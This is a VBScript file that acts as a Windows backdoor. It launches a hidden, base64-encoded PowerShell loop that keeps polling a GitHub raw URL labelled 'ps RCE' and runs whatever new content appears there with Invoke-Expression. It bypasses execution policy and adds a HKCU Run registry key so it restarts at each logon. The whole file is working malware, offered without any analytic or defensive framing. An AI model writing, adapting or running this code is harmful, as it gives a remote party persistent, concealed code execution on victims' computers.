Dim shell, targetURL, checkInterval, psCode, encodedCode, logFile
Set shell = CreateObject("WScript.Shell")
logFile = shell.ExpandEnvironmentStrings("%TEMP%\ps_monitor.log")

' ====================================================================
' CONFIGURATION
' ====================================================================
targetURL = "https://raw.githubusercontent.com/aaaaaaaaaad2131213123123belgia/test/refs/heads/main/ps%20RCE"
checkInterval = 5

' ====================================================================
' POWERSHELL CODE (With error logging for debugging)
' ====================================================================
' Simple logic: Fetch baseline first (no exec), then check for changes
psCode = "$url='" & targetURL & "';$int=" & checkInterval & ";" & _
"$log='$env:TEMP\ps_monitor.log';" & _
"function Write-Log($m){Add-Content $log -Value ""[$(Get-Date)] $m"" -ErrorAction SilentlyContinue};" & _
"Write-Log 'Starting monitor...';" & _
"$last='';" & _
"while($last -eq ''){" & _
    "try{$r=Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 10;" & _
    "if($r.StatusCode -eq 200){$last=$r.Content;Write-Log ""Baseline set, length: $($last.Length)""}};" & _
    "catch{Write-Log ""Baseline fetch failed: $($_.Exception.Message)"";Start-Sleep -Seconds 3}" & _
"};" & _
"Write-Log 'Entering monitor loop...';" & _
"while($true){" & _
    "Start-Sleep -Seconds $int;" & _
    "try{$r=Invoke-WebRequest -Uri $url -UseBasicParsing -TimeoutSec 10;" & _
    "if($r.StatusCode -eq 200){" & _
        "$current=$r.Content;" & _
        "if($current -ne $last){" & _
            "Write-Log ""Content changed, executing..."";" & _
            "$last=$current;" & _
            "Invoke-Expression $current;" & _
            "Write-Log ""Execution completed""" & _
        "}else{Write-Log 'No change detected'}" & _
    "}}catch{Write-Log ""Error: $($_.Exception.Message)""" & _
"}"

encodedCode = Base64Encode(psCode)

' Write to log for debugging
Dim fso, f
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(logFile, 8, True)
f.WriteLine "[" & Now & "] VBS starting, URL: " & targetURL
f.WriteLine "[" & Now & "] Encoded command length: " & Len(encodedCode)
f.Close

' ====================================================================
' REGISTRY PERSISTENCE
' ====================================================================
Dim regPath, scriptPath
regPath = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyBackgroundReceiver"
scriptPath = WScript.ScriptFullName

On Error Resume Next
shell.RegWrite regPath, "wscript.exe //B """ & scriptPath & """", "REG_SZ"
If Err.Number <> 0 Then
    Set f = fso.OpenTextFile(logFile, 8, True)
    f.WriteLine "[" & Now & "] Registry write failed: " & Err.Description
    f.Close
End If
On Error GoTo 0

' ====================================================================
' EXECUTE
' ====================================================================
shell.Run "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -EncodedCommand " & encodedCode, 0, False

Set f = fso.OpenTextFile(logFile, 8, True)
f.WriteLine "[" & Now & "] Launched PowerShell"
f.Close

' ====================================================================
' BASE64 ENCODE (Fixed for Unicode)
' ====================================================================
Function Base64Encode(s)
    Dim oXML, oNode, binaryData
    Set oXML = CreateObject("MSXML2.DOMDocument.3.0")
    Set oNode = oXML.createElement("base64")
    
    ' Convert string to binary using ADODB.Stream with UTF-16LE encoding (required for PowerShell)
    Dim oStream
    Set oStream = CreateObject("ADODB.Stream")
    oStream.Type = 2 'Text
    oStream.Mode = 3 'ReadWrite
    oStream.Charset = "UTF-16LE"
    oStream.Open
    oStream.WriteText s
    oStream.Position = 0
    oStream.Type = 1 'Binary
    binaryData = oStream.Read
    oStream.Close
    Set oStream = Nothing
    
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue = binaryData
    Base64Encode = Replace(Replace(oNode.text, vbLf, ""), vbCr, "")
    
    Set oNode = Nothing
    Set oXML = Nothing
End Function
